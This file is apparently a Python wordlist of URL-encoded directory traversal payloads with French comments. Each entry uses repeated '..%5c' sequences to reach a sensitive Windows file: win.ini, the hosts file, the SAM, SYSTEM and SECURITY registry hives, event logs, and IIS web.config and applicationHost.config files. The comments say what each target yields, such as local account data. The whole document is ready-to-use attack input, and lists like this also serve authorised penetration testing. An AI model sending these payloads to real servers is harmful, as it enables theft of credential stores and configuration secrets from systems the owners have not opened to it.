windows_traversals_1_encoded = [
    # Configuration système de base
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",                    # Fichier historique toujours présent
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system.ini",                  # Vieux fichier config Windows
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/drivers/etc/hosts",  # Fichier hosts local
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/drivers/etc/networks",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/drivers/etc/protocol",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/drivers/etc/services",

    # SAM et registre (attention, nécessite souvent des privilèges)
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/config/SAM",         # Comptes locaux
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/config/SYSTEM",      # Informations système
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/config/SECURITY",    # Infos de sécurité
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/config/SOFTWARE",    # Logiciels installés
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/config/DEFAULT",     # Paramètres par défaut

    # Journaux d'événements
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/winevt/Logs/System.evtx",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/winevt/Logs/Security.evtx",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/winevt/Logs/Application.evtx",

    # Fichiers de configuration IIS (serveur web)
    "..%5c..%5c..%5c..%5c..%5c..%5cinetpub/logs/LogFiles/W3SVC1/u_ex230101.log",  # Exemple log IIS
    "..%5c..%5c..%5c..%5c..%5c..%5cinetpub/wwwroot/web.config",                    # Config du site IIS
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows/system32/inetsrv/config/applicationHost.config"  # Config globale IIS
]